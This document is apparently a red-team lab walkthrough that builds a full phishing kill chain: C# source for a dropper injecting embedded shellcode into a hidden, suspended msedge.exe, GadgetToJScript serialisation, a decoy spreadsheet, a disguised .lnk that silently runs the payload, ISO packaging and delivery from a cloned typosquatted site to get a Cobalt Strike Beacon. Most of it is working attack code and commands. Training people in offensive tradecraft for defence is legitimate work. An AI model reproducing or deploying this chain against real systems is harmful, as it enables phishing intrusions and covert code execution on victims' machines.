# Kill Chain-1

## Payload <a href="#payload" id="payload"></a>

1. On the Attacker Desktop, open a Terminal window and create a new directory to hold the dependencies for the infection chain.
   1. mkdir C:\Payloads\deals
2. Open Visual Studio and create a new Class Library (.NET Framework) project:
   1. Project name: MyDropper.
   2. Place in the same directory: Checked
3. Add _http\_x64.xprocess.bin_ (located in _C:\Payloads_) as an embedded resource.
4. Copy the following code into Class1.cs:

```csharp
using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
 
namespace MyDropper
{
    public class Dropper
    {
        public Dropper()
        {
            var si = new STARTUPINFOA
            {
                cb = (uint)Marshal.SizeOf<STARTUPINFOA>(),
                dwFlags = STARTUPINFO_FLAGS.STARTF_USESHOWWINDOW
            };
 
            // create hidden + suspended msedge process
            var success = CreateProcessA(
                "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
                "\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" --no-startup-window",
                IntPtr.Zero,
                IntPtr.Zero,
                false,
                PROCESS_CREATION_FLAGS.CREATE_NO_WINDOW | PROCESS_CREATION_FLAGS.CREATE_SUSPENDED,
                IntPtr.Zero,
                "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\",
                ref si,
                out var pi);
 
            if (!success)
                return;
 
            // get basic process information
            var szPbi = Marshal.SizeOf<PROCESS_BASIC_INFORMATION>();
            var lpPbi = Marshal.AllocHGlobal(szPbi);
 
            NtQueryInformationProcess(
                pi.hProcess,
                PROCESSINFOCLASS.ProcessBasicInformation,
                lpPbi,
                (uint)szPbi,
                out _);
 
            // marshal data to structure
            var pbi = Marshal.PtrToStructure<PROCESS_BASIC_INFORMATION>(lpPbi);
            Marshal.FreeHGlobal(lpPbi);
 
            // calculate pointer to image base address
            var lpImageBaseAddress = pbi.PebBaseAddress + 0x10;
 
            // buffer to hold data, 64-bit addresses are 8 bytes
            var bImageBaseAddress = new byte[8];
 
            // read data from spawned process
            ReadProcessMemory(
                pi.hProcess,
                lpImageBaseAddress,
                bImageBaseAddress,
                8,
                out _);
 
            // convert address bytes to pointer
            var baseAddress = (IntPtr)BitConverter.ToInt64(bImageBaseAddress, 0);
 
            // read pe headers
            var data = new byte[512];
 
            ReadProcessMemory(
                pi.hProcess,
                baseAddress,
                data,
                512,
                out _);
 
            // read e_lfanew
            var e_lfanew = BitConverter.ToInt32(data, 0x3C);
 
            // calculate rva
            var rvaOffset = e_lfanew + 0x28;
            var rva = BitConverter.ToUInt32(data, rvaOffset);
 
            // calculate address of entry point
            var lpEntryPoint = (IntPtr)((UInt64)baseAddress + rva);
 
            // read the shellcode
            byte[] shellcode;
 
            var assembly = Assembly.GetExecutingAssembly();
 
            using (var rs = assembly.GetManifestResourceStream("MyDropper.http_x64.xprocess.bin"))
            {
                // convert stream to raw byte[]
                using (var ms = new MemoryStream())
                {
                    rs.CopyTo(ms);
                    shellcode = ms.ToArray();
                }
            }
 
            // copy shellcode into address of entry point
            WriteProcessMemory(
                pi.hProcess,
                lpEntryPoint,
                shellcode,
                shellcode.Length,
                out _);
 
            // resume process
            ResumeThread(pi.hThread);
        }
 
        [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true, CharSet = CharSet.Ansi)]
        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
        public static extern bool CreateProcessA(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            PROCESS_CREATION_FLAGS dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref STARTUPINFOA lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);
 
        [DllImport("ntdll.dll", ExactSpelling = true)]
        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
        public static extern uint NtQueryInformationProcess(
            IntPtr processHandle,
            PROCESSINFOCLASS processInformationClass,
            IntPtr processInformation,
            uint processInformationLength,
            out uint returnLength);
 
        [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
        public static extern bool ReadProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            UInt64 nSize,
            out uint lpNumberOfBytesRead);
 
        [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
        public static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            int nSize,
            out int lpNumberOfBytesWritten);
 
        [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
        public static extern uint ResumeThread(IntPtr hThread);
    }
 
    [Flags]
    public enum PROCESS_CREATION_FLAGS : uint
    {
        DEBUG_PROCESS = 0x00000001,
        DEBUG_ONLY_THIS_PROCESS = 0x00000002,
        CREATE_SUSPENDED = 0x00000004,
        DETACHED_PROCESS = 0x00000008,
        CREATE_NEW_CONSOLE = 0x00000010,
        NORMAL_PRIORITY_CLASS = 0x00000020,
        IDLE_PRIORITY_CLASS = 0x00000040,
        HIGH_PRIORITY_CLASS = 0x00000080,
        REALTIME_PRIORITY_CLASS = 0x00000100,
        CREATE_NEW_PROCESS_GROUP = 0x00000200,
        CREATE_UNICODE_ENVIRONMENT = 0x00000400,
        CREATE_SEPARATE_WOW_VDM = 0x00000800,
        CREATE_SHARED_WOW_VDM = 0x00001000,
        CREATE_FORCEDOS = 0x00002000,
        BELOW_NORMAL_PRIORITY_CLASS = 0x00004000,
        ABOVE_NORMAL_PRIORITY_CLASS = 0x00008000,
        INHERIT_PARENT_AFFINITY = 0x00010000,
        INHERIT_CALLER_PRIORITY = 0x00020000,
        CREATE_PROTECTED_PROCESS = 0x00040000,
        EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
        PROCESS_MODE_BACKGROUND_BEGIN = 0x00100000,
        PROCESS_MODE_BACKGROUND_END = 0x00200000,
        CREATE_SECURE_PROCESS = 0x00400000,
        CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
        CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
        CREATE_DEFAULT_ERROR_MODE = 0x04000000,
        CREATE_NO_WINDOW = 0x08000000,
        PROFILE_USER = 0x10000000,
        PROFILE_KERNEL = 0x20000000,
        PROFILE_SERVER = 0x40000000,
        CREATE_IGNORE_SYSTEM_DEFAULT = 0x80000000
    }
 
    public struct STARTUPINFOA            
    {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public STARTUPINFO_FLAGS dwFlags;
        public ushort wShowWindow;
        public ushort cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }
 
    [Flags]
    public enum STARTUPINFO_FLAGS : uint
    {
        STARTF_FORCEONFEEDBACK = 0x00000040,
        STARTF_FORCEOFFFEEDBACK = 0x00000080,
        STARTF_PREVENTPINNING = 0x00002000,
        STARTF_RUNFULLSCREEN = 0x00000020,
        STARTF_TITLEISAPPID = 0x00001000,
        STARTF_TITLEISLINKNAME = 0x00000800,
        STARTF_UNTRUSTEDSOURCE = 0x00008000,
        STARTF_USECOUNTCHARS = 0x00000008,
        STARTF_USEFILLATTRIBUTE = 0x00000010,
        STARTF_USEHOTKEY = 0x00000200,
        STARTF_USEPOSITION = 0x00000004,
        STARTF_USESHOWWINDOW = 0x00000001,
        STARTF_USESIZE = 0x00000002,
        STARTF_USESTDHANDLES = 0x00000100
    }
 
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }
 
    public enum PROCESSINFOCLASS
    {
        ProcessBasicInformation = 0
    }
 
    public struct PROCESS_BASIC_INFORMATION
    {
        public uint ExitStatus;
        public IntPtr PebBaseAddress;
        public ulong AffinityMask;
        public int BasePriority;
        public ulong UniqueProcessId;
        public ulong InheritedFromUniqueProcessId;
    }
}

```

1. Build the project to a DLL in Release mode.
2.  Serialise the DLL using G2JS.

    ```terminal-nocolor
    terminalTypeCopyC:\Tools\GadgetToJScript\GadgetToJScript\bin\Release\GadgetToJScript.exe -a .\source\repos\MyDropper\bin\Release\MyDropper.dll -w js -b -o C:\Payloads\deals\deals
    ```

### Sanity Test <a href="#sanity-test" id="sanity-test"></a>

Launch Cobalt Strike and test the serialised payload by running wscript C:\Payloads\deals\deals.js in a command prompt.

## Decoy <a href="#decoy" id="decoy"></a>

1. Open Excel and create a new blank workbook.
2.  Add some dummy deals data.

    ```xlsx-nocolor
    xlsxTypeCopyid  product      discount  code
    1   Prodder      56%       54473-150
    2   Viva         9%        0378-5713
    3   Aerified     22%       43742-0187
    4   Zaam-Dox     26%       35356-687
    5   Rank         41%       63323-300
    6   Pannier      61%       50804-302
    7   Wrapsafe     32%       67046-223
    8   Voltsillam   58%       55910-721
    9   Ventosanzap  4%        0485-0051
    10  Otcom        54%       36987-2281
    ```
3. Save the workbook as _C:\Payloads\deals\deals.xlsx_.

## Trigger <a href="#trigger" id="trigger"></a>

1.  In PowerShell, create a shortcut that will execute the payload and open the decoy.

    ```powershell
    powershellTypeCopy$wsh = New-Object -ComObject WScript.Shell
    $lnk = $wsh.CreateShortcut("C:\Payloads\deals\deals.xlsx.lnk")
    $lnk.TargetPath = "%COMSPEC%"
    $lnk.Arguments = "/C start deals.xlsx && wscript deals.js"
    $lnk.IconLocation = "%ProgramFiles%\Microsoft Office\root\Office16\EXCEL.EXE,0"
    $lnk.Save()
    ```



## Container <a href="#container" id="container"></a>

1.  In Ubuntu (WSL), use PackMyPayload to package all the files into an ISO.

    ```ubuntu-nocolor
    python3 /mnt/c/Tools/PackMyPayload/PackMyPayload.py -H deals.xlsx,deals.js /mnt/c/Payloads/deals/ /mnt/c/Payloads/deals/deals.iso
    ```



<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

## Delivery <a href="#delivery" id="delivery"></a>

1. Host the ISO on Cobalt Strike's built-in web server.
   1. Go to **Site Management > Host File**.
   2. File: _C:\Payloads\deals\deals.iso_
   3. Local URI: /deals.iso
   4. Local Host: www.bleepincomputer.com
   5. Click **Launch**.
2. Clone a legitimate web page (**Site Management > Clone Site**).
   1. Clone URL: https://deals.bleepingcomputer.com
   2. Local URI: /deals
   3. Local Host: www.bleepincomputer.com
   4. Attack: _deals.iso_
   5. Click **Clone**.
3. Switch over to [Workstation 1](https://labclient.labondemand.com/Instructions/c2f30abb-c977-4944-9bbd-9a8f83ee66c5) and login with Passw0rd!.
4. Open Microsoft Edge and browse to http://www.bleepincomputer.com/deals
5. Click _Open file_ when deals.iso downloads.
6. Double-click on _deals.xlsx_ and the decoy will open.
7. Switch back to [Attacker Desktop](https://labclient.labondemand.com/Instructions/c2f30abb-c977-4944-9bbd-9a8f83ee66c5) and a Beacon should be checking in from msedge.exe.
